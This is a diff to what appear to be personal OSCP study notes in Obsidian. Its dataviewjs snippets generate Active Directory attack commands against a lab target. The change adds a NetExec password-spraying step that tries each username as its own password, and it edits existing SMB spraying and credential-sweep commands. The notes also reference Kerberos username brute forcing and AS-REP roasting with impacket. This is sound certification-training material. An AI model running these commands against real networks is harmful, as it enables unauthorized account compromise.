@@ -32,7 +32,6 @@ dv.paragraph("```bash\n" + command + "\n```");
 ```
 
 ---
-
 ## Port 88 : Kerberos
 
 ## No creds at all : Kerbrute force usernames
@@ -78,6 +77,15 @@ const command = `impacket-GetNPUsers -request -usersfile Users.txt ${discoveredD
 
 dv.paragraph("```bash\n" + command + "\n```");
 ```
+## Password Spraying : Same PW as User
+
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";
+
+const command = `nxc smb ${ip} -u users -p users --continue-on-success`;
+
+dv.paragraph("```bash\n" + command + "\n```");
+```
 
 ---
 
@@ -96,7 +104,7 @@ Add these usernames into user_list
 ```dataviewjs
 const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";
 
-const command = `nxc smb ${ip} -u [userlist] -p [pw] --continue-on-success | grep '[+]'`;
+const command = `nxc smb ${ip} -u users -p [pw] --continue-on-success | grep '[+]'`;
 
 dv.paragraph("```bash\n" + command + "\n```");
 ```
@@ -110,7 +118,7 @@ Upon Entry, Once Creds for unknown usage is obtained, use [[NetExec]]to check ac
 ```dataviewjs
 const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";
 
-const command = `cd ~/Desktop/Tools/Windows && ./nxc-sweep ${ip} -u '[USER]' -p '[PASSWORD]'`;
+const command = `cd ~/Desktop/Tools/Windows && ./nxc-sweep ${ip} -u '[USER]' -p '[PASSWORD]' --continue-on-success`;
 
 dv.paragraph("```bash\n" + command + "\n```");
 ```
